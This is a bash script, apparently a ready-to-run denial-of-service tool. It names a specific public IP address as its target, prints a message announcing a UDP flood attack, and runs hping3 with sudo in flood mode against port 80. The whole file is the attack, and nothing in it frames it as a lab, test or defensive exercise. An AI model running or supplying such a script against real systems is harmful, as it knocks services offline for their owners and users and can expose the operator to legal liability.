#!/bin/bash
TARGET="65.109.132.110"
echo "[*] Starting UDP flood attack on $TARGET..."
sudo hping3 --flood --udp -p 80 $TARGET
